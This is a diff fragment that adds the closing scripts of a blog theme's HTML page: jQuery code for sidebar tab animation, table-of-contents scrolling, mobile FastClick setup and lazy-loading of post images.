+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
